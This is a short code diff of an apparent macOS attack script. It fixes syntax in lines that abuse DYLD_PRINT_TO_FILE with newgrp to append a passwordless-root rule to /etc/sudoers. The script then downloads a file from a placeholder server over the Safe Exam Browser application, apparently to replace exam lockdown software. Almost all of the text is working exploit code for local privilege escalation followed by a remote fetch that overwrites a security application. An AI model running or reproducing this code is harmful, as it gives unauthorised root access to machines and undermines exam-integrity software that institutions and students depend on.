@@ -26,9 +26,9 @@ def libmalloc():
 	sys.stderr.write("\ndone\n")
 if "10.10.5" in systemver:
 	libmalloc()
-else
+else:
 	os.system(" echo 'echo \"$(whoami) ALL=(ALL) NOPASSWD:ALL\" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp")
-rootcheck = subprocess.check_output(['sudo visudo'])
+rootcheck = subprocess.check_output(['visudo'])
 if "denied" in rootcheck:
 	os.close(1)
 urllib.urlretrieve ("serverAddress", "/Applications/Safe\ Exam\ Browser.app")
